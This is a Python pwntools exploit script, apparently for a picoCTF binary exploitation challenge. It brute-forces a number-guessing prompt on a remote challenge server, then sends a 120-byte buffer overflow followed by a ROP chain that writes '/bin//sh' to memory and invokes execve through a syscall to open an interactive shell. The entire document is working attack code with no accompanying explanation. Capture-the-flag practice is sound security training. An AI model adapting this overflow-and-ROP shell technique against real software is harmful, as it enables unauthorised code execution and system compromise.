from pwn import *

context.arch = 'amd64'
context.endian = 'little'
e = ELF("./vuln")

p = e.process() if args.LOCAL else remote('jupiter.challenges.picoctf.org', 42951)

i = 0

from struct import pack

payload = b'A'*120 # padding

payload += pack('<Q', 0x0000000000410ca3) # pop rsi ; ret
payload += pack('<Q', 0x00000000006ba0e0) # address of data section
payload += pack('<Q', 0x00000000004163f4) # pop rax ; ret
payload += b'/bin//sh'
payload += pack('<Q', 0x000000000047ff91) # mov qword ptr [rsi], rax ; ret

payload += pack('<Q', 0x0000000000400696) # pop rdi ; ret
payload += pack('<Q', 0x00000000006ba0e0) # address of data section
payload += pack('<Q', 0x000000000044cc49) # pop rdx ; pop rsi ; ret
payload += pack('<Q', 0x0000000000000000) # set rdx to 0
payload += pack('<Q', 0x0000000000000000) # set rsi to 0
payload += pack('<Q', 0x00000000004163f4) # pop rax ; ret
payload += pack('<Q', 0x000000000000003b) # Set rax to 59
payload += pack('<Q', 0x000000000040137c) # syscall ; ret


while True:
    rec = p.recvuntil("win", timeout=1)
    if rec:
        print(f'correct guess {i}')
        p.sendline(payload)
        print(p.recvline())
        break
    b = p.recvuntil("?")
    print(rec)
    print(b)
    p.sendline(str(i))
    i += 1

p.interactive()
